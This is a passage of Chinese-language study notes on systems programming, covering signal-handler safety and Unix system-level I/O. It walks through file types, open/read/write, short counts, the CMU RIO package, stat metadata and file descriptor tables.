时处理不当，那么可能造成相当大的危害。</p><p>我们从处理多线程程序安全性的同样思路出发，提出了以下几点避免<strong>异步信号冲突</strong>的解决方案：</p><ol><li>signal handlers 尽量保持简洁，使用 <strong>异步信号安全</strong> 的函数；</li><li>每次进入、退出 signal handler 时要及时保存、恢复 <code>errno</code>，因为 signal handler 内部可能有系统调用错误，为了防止系统错误难以追踪，我们最好这么做；</li><li>在同时被原程序、Signal Handler 使用的共享变量前应该声明 <code>volatile</code> 关键字，对于仅读写的简单类型最好使用 <code>sig_atomic_t</code> 类型；</li><li>在原程序、Signal Handler 操作共享变量时，应该阻塞其他所有信号，防止同进程的 interleaving 造成共享资源访问冲突；</li><li>不以信号接收次数来计信号发送次数；</li><li>对于含有 <code>fork</code> + 信号的程序设计，如果拿不准，建议画进程图，因为你不能假设父子进程的先后顺序，及时进行信号阻塞。这通常是造成共享资源访问冲突的常见点；</li><li>最后，对于显式等待信号的问题，我们可以使用 <code>sigsuspend</code> 系统调用，保证 <strong>取消阻塞和暂停等待两步操作的原子性</strong>。</li></ol><p>此外，我们还认识了进程组，一种关联多个进程，可以同时向进程组中所有进程发送信号的机制。</p><p>最后，列举一下我们在这一节中学习到了哪些系统调用（包括系统级函数）：<code>setpgrp</code>、<code>setpgid</code>、<code>getpgrp</code>、<code>getpgid</code>、<code>signal</code>、<code>sigprocmask</code>、<code>sigemptyset</code>、<code>sigfillset</code>、<code>sigaddset</code>、<code>sigdelset</code>、<code>sigsuspend</code>；</p><h2 id="13-6-Non-local-Jump"><a href="#13-6-Non-local-Jump" class="headerlink" title="13.6 Non-local Jump"></a>13.6 Non-local Jump</h2><blockquote><p>Powerful (but dangerous) user-level mechanism for transferring control to an arbitrary location.</p></blockquote><p>略</p><h1 id="Chapter-14-System-Level-I-O"><a href="#Chapter-14-System-Level-I-O" class="headerlink" title="Chapter 14 System Level I/O"></a>Chapter 14 System Level I/O</h1><p>本章将讨论操作系统较为底层的 I/O，在 Unix 和其他类型的操作系统上一样支持。</p><h2 id="14-1-Unix-I-O-Overview"><a href="#14-1-Unix-I-O-Overview" class="headerlink" title="14.1 Unix I/O Overview"></a>14.1 Unix I/O Overview</h2><p>我们先讨论 Unix 上的 I/O 的原因是，比起其他的操作系统，Unix 中的 I/O 更加简单并且一致。我们都知道在 Unix 类系统上，<strong>一切皆文件</strong>，而这些文件本质上上一个 m bytes 的<strong>字节序列（a sequence of bytes）</strong>，<strong>不去区分文件的类型</strong>，所以 Unix 操作系统实际上基本不了解文件内部的详细结构。它将文件看作存放在磁盘或外部存储介质上的某段数据，并且提供打开、写入、关闭等标准操作。</p><p>正因如此，即使是一些 I/O Device，甚至是操作系统内核也能抽象表示为具体的文件。</p><blockquote><p><code>/dev/sdaN</code>: Unix 的 N 号磁盘分区；</p><p><code>/dev/ttyN</code>：Unix 的 N 号终端（为何叫 TTY？因为早期人们多使用 “电传打字机（teletype）” 用于描述打字机与计算机的接口）；</p><p><code>/boot/vmlinuz-xxx-generic</code>：Unix 的内核镜像文件；</p><p><code>/proc</code>：Unix 的内核数据结构；</p><p><code>/var/run/*.sock</code>、<code>/run/*.sock</code>、<code>/dev/shm/*.sock</code>：Unix 的网络套接字文件；</p><p>补充：什么是套接字（socket）？</p><p>在网络一章会深入讨论。简单来说，就是在互联网规范中，当机器通过互联网通信时，消息是一段通过写入套接字这个数据结构来发送的，另一端通过读取套接字的内容来接收的。</p></blockquote><p>这样的简洁明了的抽象（elegant mapping of files to devices）就允许 Unix 类操作系统内核以一套简单的接口完成对文件和设备的访问。<strong>这套简单、核心的接口被成为 Unix I/O</strong>：</p><ul><li><p>打开、关闭文件：<code>open()</code>、<code>close()</code>；</p></li><li><p>读写文件：<code>read()</code>、<code>write()</code>；</p></li><li><p>当前文件位置（注意，<strong>不是当前文件路径</strong>：是 current file position，而不是 current file path）；</p><ul><li><p>作用：indicates next offset into file to read or write（<strong>提示下一次向文件中写或读的字节偏移量，即下次从哪里读写</strong>）；</p></li><li><p>接口：<code>lseek()</code>，改变当前文件指针的指向；</p></li><li><p>特征：<strong>只有某些文件有这个接口</strong>。因为对那些文件而言，没法移动、备份和恢复先前的已读入的数据，也无法提前接收未写入的数据。</p><blockquote><p>例如 socket 文件就是没有这种接口的，因为它无法在时间上进行跳转，只能在数据包进入时对其读写；</p></blockquote></li></ul></li></ul><p>由于这些文件本质上还是不同的具体事物，在客观上有内在差别（就像一些类都继承于一个公共类，但它们终究需要实现不同功能）。这些文件属性上的差别则可以抽象为<strong>文件类型</strong>。</p><p>Unix 中的文件类型有以下几种：</p><ul><li>Regular file：普通文件（存储于磁盘驱动器上）；</li><li>Directory：一组特定文件的索引文件，其中的条目描述了其他文件的位置和属性；</li><li>Socket：与另一台机器上的一个进程沟通的文件；</li><li>Named pipes（<strong>FIFOs</strong>，先入先出型数据结构）：管道流文件。Unix 上一些程序的输出，同时也是另外一些文件的输入；</li><li>Symbolic links：符号链接。Unix 上又称软链接（与硬链接相对）；</li><li>Character and block devices：字符设备与块设备。其抽象在操作系统的设备访问层，其名称与实际物理设备特性无必然联系。<ul><li>操作系统能够<strong>随机访问固定大小数据块（chunks）</strong>的设备称为块设备（例如磁盘、软盘、CD、flash memory 等）；</li><li>操作系统只能<strong>按照字符流的方式有序访问</strong>的设备称为字符设备（例如串口、键盘等）；</li></ul></li></ul><p>本章着重讨论前三种文件，因为它们比较常见。</p><h2 id="14-2-Unix’s-Files"><a href="#14-2-Unix’s-Files" class="headerlink" title="14.2 Unix’s Files"></a>14.2 Unix’s Files</h2><h3 id="14-2-1-Regular-Files"><a href="#14-2-1-Regular-Files" class="headerlink" title="14.2.1 Regular Files"></a>14.2.1 Regular Files</h3><p>普通文件可以包含任何类型的数据。一般情况下，操作系统并不会试图分析文件内部的细节，因此操作系统内核<strong>并不知道</strong>文本文件（plain text）和二进制文件（binary）之间的差别。</p><p>注意，区分文件内容是文本还是二进制数据通常发生在应用程序层级（更高级别）。</p><blockquote><p>文本文件和二进制文件的差别：<strong>仅含有代表 ASCII / Unicode 字符的数据的文件被称为文本文件，否则被称为二进制文件</strong>；</p><p>二进制文件可以是：actual object file、图片音视频文件等等，它们包含<strong>直接以某种形式编码的字节序列</strong>；</p></blockquote><p>文本文件有个重要特征，就是它们可以看作<strong>由一系列文本行（text lines）构成</strong>的文件。通常情况下，文本行是一个以 <strong>newline 字符</strong>结尾的字符（char）序列。</p><blockquote><p>事实上，newline 字符在不同操作系统平台上定义不同，例如 Unix 上将 <code>0xa</code>（<code>\n</code>）代表的字符 <strong>line feed（LF）character</strong> 作为换行符，而 Windows 则约定以两个字符 <code>0xd 0xa</code>（<code>\r\n</code>）代表的字符 Carriage Return &amp;&amp; Line Feed（CRLF）character 作为换行符。</p><p>二者的区别与历史中的 typewriter（打字机）有关，因为换行（垂直运动，即 Line Feed）和回车（水平复位运动，即 Carriage Return）是打字机作为机械设备在换到下一行必须要做的两个运动，Windows 保留了这层含义。</p></blockquote><h3 id="14-2-2-Directories"><a href="#14-2-2-Directories" class="headerlink" title="14.2.2 Directories"></a>14.2.2 Directories</h3><p>在 Unix 操作系统（或者说操作系统中的文件系统）中，每个目录文件包含了一个 “链接” 数组，每个 “链接” 建立了一个从文件名到文件的映射关系。</p><p>每一个目录文件包含<strong>至少两个 entries</strong>：<code>.</code>（a link to itself，链接到自身）和 <code>..</code>（a link to the parent directory in the directory hierarchy，链接到目录层次中的上层目录）；</p><p>Unix 的文件系统层次结构与 Linux 相近，因此 Unix 文件系统层次结构就不再赘述。</p><p>而 <strong>当前工作目录（current working directory，<code>cwd</code>）</strong>是由 OS Kernel 维护的数据，每个进程下的不一定一致。可以通过使用 <code>cd</code> 改变当前进程的该数据；</p><p>在 Unix 和其他多数操作系统中，<strong>Pathnames（路径名）</strong>是文件层次结构中导向某个特定文件的导航方式，可以由目录文件的链接名称组成。</p><h2 id="14-3-Basic-Operations"><a href="#14-3-Basic-Operations" class="headerlink" title="14.3 Basic Operations"></a>14.3 Basic Operations</h2><p>本节的系统级函数和宏大多在 <code>&lt;fcntl.h&gt;</code>（file control）中；</p><h3 id="14-3-1-Opening-Files"><a href="#14-3-1-Opening-Files" class="headerlink" title="14.3.1 Opening Files"></a>14.3.1 Opening Files</h3><p>针对各类文件的基本操作方式之一是打开文件。它的实质是<strong>提醒 OS Kernel 已经做好访问该文件的一切准备</strong>。对此 Unix 有一个系统级函数 <code>open</code>，常用声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>第一参数可以是绝对路径，也可以是相对路径；</p></li><li><p>第二参数是 2 的某次幂的标志量（flag），允许按位运算。说明文件的打开方式（结合一些头文件，可以得到相关宏定义，例如 <code>O_RDONLY</code> 只读等）；</p></li><li><p>第三参数是文件权限位，即读取 / 创建文件的权限，可取的参数见官方文档：</p><p><img src="imgs/perm_modes.png" height="500px"></p></li><li><p>返回值体现了一个非常重要的思想：<strong>文件描述符</strong>。如果文件打开错误，则返回 <strong>-1</strong>（I/O 操作的失败情况比普通情况多很多，一定在实际使用描述符前检查是否成功打开）；</p><blockquote><p>什么是文件描述符（file descriptor）？</p><p>文件标识符是<strong>用来标识当前程序正在操作的某个已打开文件的小整型（这个小整型只有 0 ~ 1024 的范围）</strong>。</p><p>它们是按照打开顺序依此编号（从运行程序开始编号），所以大部分机器有最大打开文件数量的限制。这意味着打开了超过限制数量的文件将会造成文件资源泄漏。其中机器各方面的限制可以由以下指令查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -a</span><br></pre></td></tr></table></figure><p>另外一个值得注意的点是，在<strong>每个进程一创建的时候就会有 3 个已创建的文件：0（<code>stdin</code>）、1（<code>stdout</code>）、2（<code>stderr</code>），它们都是由 Unix Shell 打开并创建的</strong>（请回忆前一章的进程树并考虑为什么）。</p><p>其他具体内容将在 <strong>17.5.2</strong> 中讨论。</p></blockquote></li></ul><p>注：本章的系统级函数都非常底层，有些函数直接使用整型文件描述符。为了使用规范，如果你想用 <code>stdin/stdout/stderr</code> 这类文件时，请不要直接使用 <code>0/1/2</code>，更建议使用宏 <code>STDIN_FILENO/STDOUT_FILENO/STDERR_FILENO</code>；</p><h3 id="14-3-2-Closing-Files"><a href="#14-3-2-Closing-Files" class="headerlink" title="14.3.2 Closing Files"></a>14.3.2 Closing Files</h3><p>关闭文件的系统级函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span> file_descriptor)</span>;</span><br></pre></td></tr></table></figure><p>你可能会好奇，为什么这个也要有返回值，难道关闭一个文件也会报错？答案是肯定的。</p><p>在多线程编程中（就像之前提到的，它们会共享内存和数据结构），可能会出现关闭一个已经被关闭的文件的情况，这种情况也会发生问题。</p><h3 id="14-3-3-Reading-Files-amp-Writing-Files"><a href="#14-3-3-Reading-Files-amp-Writing-Files" class="headerlink" title="14.3.3 Reading Files &amp; Writing Files"></a>14.3.3 Reading Files &amp; Writing Files</h3><p>Unix 系统级函数提供了一种块读取和块写入的方式，即从当前文件指针位置开始，向后指定长度的空间的数据读入缓冲区 / 向文件写缓冲区内容，并且更新文件指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> file_descriptor, <span class="type">void</span> *buffer, <span class="type">size_t</span> buf_size)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> file_descriptor, <span class="type">void</span> *buffer, <span class="type">size_t</span> buf_size)</span>;</span><br></pre></td></tr></table></figure><p>值得注意的是，如果正确运行，那么 <code>read</code> / <code>write</code> 的返回值是<strong>实际读取 / 写入的字节数</strong>（因为从当前文件指针到最后不一定有 <code>buf_size</code> 大小的数据，这种情况称之为 <strong>short read / short write</strong>）；错误则返回 <strong>-1</strong>；而（对于 <code>read</code> 而言）如果返回 0，说明已经到达 <code>EOF</code>；</p><blockquote><p>这里介绍一个之前提到的非常有名的工具 <code>strace</code>；这个工具的功能非常强大，不过现在我们先介绍一些简单的使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace &lt;prog&gt;</span><br></pre></td></tr></table></figure><p>以上指令在运行指定程序的同时，会跟踪并向  <code>stdout</code> 打印程序使用到的<strong>所有系统调用（system call）情况</strong>；</p><p>有时候看到很乱的情况，可能是终端上 <code>stderr</code> 和 <code>stdout</code> 交织输出的原因。</p><p>如果加上参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -e trace=&lt;syscall_name[,...]&gt; &lt;prog&gt;</span><br></pre></td></tr></table></figure><p>那么就仅仅追踪指定名称的系统调用情况。</p></blockquote><p>那么，什么时候会出现 short read / short write？</p><ul><li>读文件时遇到 EOF；</li><li>从<strong>终端</strong>读一个文本行；</li><li>读写网络套接字；</li><li>……</li></ul><p>其实，short read / short write 一直是应用程序层面较为棘手的问题，所以我们一般看到很多涉及 I/O 的库几乎都将这个低层级的 I/O 接口封装起来。</p><blockquote><p>为什么棘手？</p><p>其实，short read / write 在普通程序中的问题还影响不大，因为大多数是向磁盘中写文件，而向磁盘写不会出现 EOF，因此没有 short write；从磁盘读发生 short read 只要跳出读循环就行，影响也不大）。</p><p>但是在网络套接字的读写方面影响很大。考虑一个场景，你要用 socket 发一个网络包，但是写不下的值还要判断，而且还有可能因为其他偶然原因触发 <code>EINTR</code>，并且在循环中重新拿出来再发一次。</p><p>不仅如此，网络向 socket 中发送可能是一部分一部分收到的，因此可能<u>短读后还能继续读</u>！</p></blockquote><h2 id="14-4-The-RIO-Package"><a href="#14-4-The-RIO-Package" class="headerlink" title="14.4 The RIO Package"></a>14.4 The RIO Package</h2><p>为了解决 short read / short write 对应用程序编程开发带来的麻烦，有一种对 I/O 接口的封装方式是 CMU 教授开发的 RIO Package. 这个包提供了对于底层的 Unix I/O 的包装，能够使得程序在处理 I/O 方面有较强的健壮性（robust）和较好的效率，尤其是后面章节要讨论的、受 short read / write 影响较大的网络编程。</p><p>RIO Package 提供了 2 种不同级别的 I/O 文件接口。</p><p>其中，较低级别的 I/O 接口只是对上面说到的低级 Unix I/O 进行了简单的封装，以应对 short read / write 的情况；函数 <code>rio_readn</code>  和 <code>rio_writen</code> 就是这样较低级别的封装。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">rio_readn</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *usrbuf, <span class="type">size_t</span> n)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">rio_writen</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *usrbuf, <span class="type">size_t</span> n)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rio_writen 永远不会 short count. */</span></span><br><span class="line"><span class="comment">/* rio_readn 当正常执行时，返回 num 代表实际读取的字节数（和 Unix I/O 不同，这是产生 short count 的唯一情况）；遇到 EOF 返回 0；*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 二者遇到错误都返回 -1，errno 由系统级函数 read/write 设置 */</span></span><br></pre></td></tr></table></figure><p>这两个函数属于对二进制数据的非缓冲式的读入和输出（unbuffered input &amp; output of binary data），在未读够 / 未写够指定字节数的数据之前不会返回。对于 <code>rio_readn</code>，如果是处理具有很多数据的网络套接字，那么在当前套接字读完、总体数据未读完的情况下<strong>挂起并等待</strong>；如果是读到了与给定字节数不同的时候出现 EOF，那么会返回错误；</p><p>对于 <code>rio_writen</code>，<strong>对于使用者的情况会比 <code>rio_readn</code> 简单些，所以也只需要包装到这个层次即可</strong>，因为使用者只需担心网络问题，这个函数本身会在要求的字节数内通过循环发送套接字（因为一个 socket 规范只有 1500 bytes 左右，具体大小取决于它位于哪个协议层）；</p><p>另一类是带缓冲区的 I/O 接口（<code>rio_readinitb</code>、<code>rio_readlineb</code>、<code>rio_readnb</code>），比前一类封装更高级一些，也是很多库对于 Unix I/O 常见的包装形式。它们的做法是在用户代码空间创建一个小型缓冲区（mini-buffer），用来存放已读入但未被应用程序使用的 bytes，或者为程序创建一块空间以便未来输出到文件或网络中；</p><blockquote><p>这种<strong>缓冲区的思想</strong>也存在与计算机的相当多的方面。</p></blockquote><p>带缓冲区的 RIO 有两种，一种是基于文本的，另一种是基于字节（二进制数据）的。如下代码注释，可见，在网络套接字的文本行阅读方面，<code>rio_readlineb</code> 非常有用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rio_readinitb</span><span class="params">(<span class="type">rio_t</span> *rp, <span class="type">int</span> fd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read a text line of up to `maxlen` bytes from file `fd` and store the line in `usrbuf`.</span></span><br><span class="line"><span class="comment"> * Stopping Conditions:</span></span><br><span class="line"><span class="comment"> * - `maxlen` bytes read;</span></span><br><span class="line"><span class="comment"> * - EOF encountered;</span></span><br><span class="line"><span class="comment"> * - Newline (`\n`) encountered</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">rio_readlineb</span><span class="params">(<span class="type">rio_t</span> *rp, <span class="type">void</span> *usrbuf, <span class="type">size_t</span> maxlen)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read up to `n` bytes from file `fd` and store them in `usrbuf`.</span></span><br><span class="line"><span class="comment"> * Stopping Conditions:</span></span><br><span class="line"><span class="comment"> * - `maxlen` bytes read;</span></span><br><span class="line"><span class="comment"> * - EOF encountered;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">rio_readnb</span><span class="params">(<span class="type">rio_t</span> *rp, <span class="type">void</span> *usrbuf, <span class="type">size_t</span> n)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当正常执行时，返回 num 代表实际读取的字节数（和 Unix I/O 不同，这是产生 short count 的唯一情况）；*/</span></span><br><span class="line"><span class="comment">/*遇到 EOF 返回 0；遇到错误返回 -1，errno 由系统级函数 read 设置 */</span></span><br></pre></td></tr></table></figure><p>这种 RIO 库的健壮性还在于，<code>rio_readlineb</code> 和 <code>rio_readnb</code> 允许对一个文件描述符进行交织运行（多线程中对一个文件描述符），但别和 <code>rio_readn</code> 连用；</p><p>至于含缓冲区的 RIO 的实现也不难，它的目标就是设计一个读取内容的缓冲地带，让重复的读取内容不至于每次访问 I/O 都使用系统调用；举个例子：</p><p><img src="imgs/rio_readnb.png" height="300px"></p><p>如上图，假设程序想要读取系统上的一个 Unix file，那么该文件从头至 current file position 就是我们想要的 buffered portion；在读取的时候，<code>rio_readnb/rio_readlineb</code> 会按 buffered portion 的大小在 user code space 中创建一个同等大小的缓冲区（上图 buffer），由 <code>rio_buf</code> 指针管理这片空间的起始地址，由 <code>rio_bufptr</code> 管理当前程序读到 buffer 的哪里；而 <code>rio_cnt</code> 则代表当前还有多少数据没有读入缓冲区；</p><p>因此，根据 <code>rio buffer</code> 的使用分析，我们发现维护 <code>rio_t</code> 的结构体应该是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> rio_fd;</span><br><span class="line">    <span class="type">int</span> rio_cnt;</span><br><span class="line">    <span class="type">char</span> *rio_bufptr;</span><br><span class="line">    <span class="type">char</span> rio_buf[RIO_BUFSIZE];</span><br><span class="line">&#125; <span class="type">rio_t</span>;</span><br></pre></td></tr></table></figure><p>更多的内容大家可以通过阅读 RIO Package 的源码获取，并且可以在此基础上包装属于自己的 routines；</p><h2 id="14-5-File-Metadata-Sharing-and-Redirection"><a href="#14-5-File-Metadata-Sharing-and-Redirection" class="headerlink" title="14.5 File Metadata, Sharing and Redirection"></a>14.5 File Metadata, Sharing and Redirection</h2><h3 id="14-5-1-Metadata"><a href="#14-5-1-Metadata" class="headerlink" title="14.5.1 Metadata"></a>14.5.1 Metadata</h3><p>几乎所有操作系统平台上，每个文件中都有一个非常重要的部分是文件元数据（file metadata）。所谓 metadata 就是文件中实际包含的数据的信息，例如<strong>应用层级的文件类型信息、文件权限信息（R/W/X）、文件所有权信息、创建/访问/修改时间……</strong></p><blockquote><p>什么？你说 Windows 上创建一个文本文件，然后把后缀名删了，好像就没有了？其实操作系统在创建文件、在显示到桌面之前就将文件元信息设置好了，不信你看看右击属性。</p></blockquote><p>在 Unix 系统中，这种 metadata 以一个结构体 <code>stat</code> 进行存储，这种结构体类型也是 C library 函数 <code>stat</code>、<code>fstat</code>（查看文件元数据的函数）的返回值类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Metadata returned by the stat and fstat functions */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">    <span class="type">dev_t</span>st_dev; <span class="comment">/* Device */</span></span><br><span class="line">    <span class="type">ino_t</span>st_ino; <span class="comment">/* inode */</span></span><br><span class="line">    <span class="type">mode_t</span>st_mode; <span class="comment">/* Protection and file type */</span></span><br><span class="line">    <span class="type">nlink_t</span>st_nlink; <span class="comment">/* Number of hard links */</span></span><br><span class="line">    <span class="type">uid_t</span>st_uid; <span class="comment">/* User ID of owner */</span></span><br><span class="line">    <span class="type">gid_t</span>st_gid; <span class="comment">/* Group ID of owner */</span></span><br><span class="line">    <span class="type">dev_t</span>st_rdev; <span class="comment">/* Device type (if inode device) */</span></span><br><span class="line">    <span class="type">off_t</span>st_size; <span class="comment">/* Total size, in bytes */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> st_blksize; <span class="comment">/* Blocksize for filesystem I/O */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> st_blocks; <span class="comment">/* Number of blocks allocated */</span></span><br><span class="line">    <span class="type">time_t</span> st_atime; <span class="comment">/* Time of last access */</span></span><br><span class="line">    <span class="type">time_t</span> st_mtime; <span class="comment">/* Time of last modification */</span></span><br><span class="line">    <span class="type">time_t</span> st_ctime; <span class="comment">/* Time of last change */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="keyword">struct</span> stat *statbuf)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> stat *statbuf)</span>;    <span class="comment">/* `fd` should be a valid open file descriptor. */</span></span><br></pre></td></tr></table></figure><p>如何用这些数据？一般情况下，我们可以借助一些 C library 内置宏来检查数据的含义。这里不多赘述，以一个程序为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat</span>;</span></span><br><span class="line">    <span class="type">char</span> *type, *readok;</span><br><span class="line">    </span><br><span class="line">    Stat(argv[<span class="number">1</span>], &amp;stat);</span><br><span class="line">    <span class="keyword">if</span> (S_ISREG(stat.st_mode))    <span class="comment">/* Determine file type. */</span></span><br><span class="line">        type = <span class="string">&quot;regular&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (S_ISDIR(stat.st_mode))</span><br><span class="line">        type = <span class="string">&quot;directory&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> type = <span class="string">&quot;other&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (stat.st_mode &amp; S_IRUSER)    <span class="comment">/* Check read access. */</span></span><br><span class="line">        readok = <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> readok = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;type: %s, read: %s\n&quot;</span>, type, readok);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>知识补充：Unix 系统中的 man page 的正确使用方法。</p><p>我们都知道，Unix 中的 <code>man</code> 指令相当于一个帮助文档，通常情况下，<code>man &lt;fname&gt;</code> 会进入 <code>fname</code> 所添加的帮助文档的<strong>第一章</strong>中。你可以使用 <code>man &lt;chapterN&gt; &lt;fname&gt;</code> 来指定查看第几章的 <code>fname</code> 文档。</p><p>在 man 程序管理帮助文档的规范中，每章的内容有明确的使用范围：</p><p>man 的第一章通常介绍 <code>fname</code> 作为一个<strong>系统指令</strong>（编译为了一个二进制文件放在系统中）的使用方法，通常包含一些该命令的命令行技巧和参数；</p><p>man 的第二章通常介绍 <code>fname</code> 作为一个<strong>系统级函数/系统调用</strong>在源码中的使用方法，通常包含了一些该函数的 API 文档内容和声明；</p><p>有些 <code>fname</code> 既在 Unix 中包装成了二进制的程序供命令行使用，又在头文件和系统的链接库中存在，以供源码使用（例如 <code>kill</code>），所有会同时存在这两章。</p><p>man 还有更多的章节，一般到第 8 章，其中的含义可以自行搜寻。</p></blockquote><h3 id="14-5-2-File-Sharing-amp-File-Descriptor"><a href="#14-5-2-File-Sharing-amp-File-Descriptor" class="headerlink" title="14.5.2 File Sharing &amp; File Descriptor"></a>14.5.2 File Sharing &amp; File Descriptor</h3><p>之前我们用了很长时间的 “file descriptor” 这个名词，接下来将讨论一下所有的文件在程序中如何用 file descriptor 进行标识，或者说，背后的机制是怎样的。</p><blockquote><p>⚠ <strong>这里是考试的难点！！！光听老师讲、看这部分的信息，想把题目做对是不够的！需要自行研究习题和历年考题。</strong></p></blockquote><p>OS 内部很多内部数据结构都与具体执行中的进程有关，例如前面提到的页表、用户栈、OS Kernel 等等，它们都存放在这个进程对应的虚拟内存中。</p><p>文件描述符也不例外，<strong>每个进程都会在其虚拟内存中维护唯一一个描述符表（descriptor table）</strong>。</p><p>还有两种非常特殊的数据结构，一种是 <strong>文件表（open file table）</strong>，另一种是 <strong>虚拟结点表（v-node table）</strong>；<strong>它们被计算机中所有进程共享</strong>；</p><p>如图所示：</p><p><img src="imgs/fd.png"></p><p>很早之前我们就了解过，文件描述符为 0、1、2 的特殊含义，这里不再赘述。</p><p>我们需要注意以下几点：</p><ul><li><p>v-Node Table 就是 Unix files 的 <code>stat</code> 结构体的表，每个 v-Node Table 与物理存储器上的文件<strong>一一对应</strong>（双射），无论文件是否被打开；</p></li><li><p>Descriptor Table 各个 entry 的内容存放的是<strong>指向各个 Open File Table 的指针</strong>，也表示<strong>当前进程已打开但未关闭的文件</strong>。而描述符相当于是对 Descriptor Table 的<strong>索引</strong>；</p></li><li><p>Open File Tables 由 OS Kernel 维护。每个 Open File Table 的第一个字段即为指向 v-Node Table 的指针，与每个 v-Node Table 的关系<strong>必然是函数关系，但既不是单射也不是满射</strong>；</p><blockquote><p>即：</p><ol><li><p>对任意一个 Open File Table 而言，它必然指向一个唯一的 v-Node Table（即物理文件）；</p></li><li><p>存在两个 Open 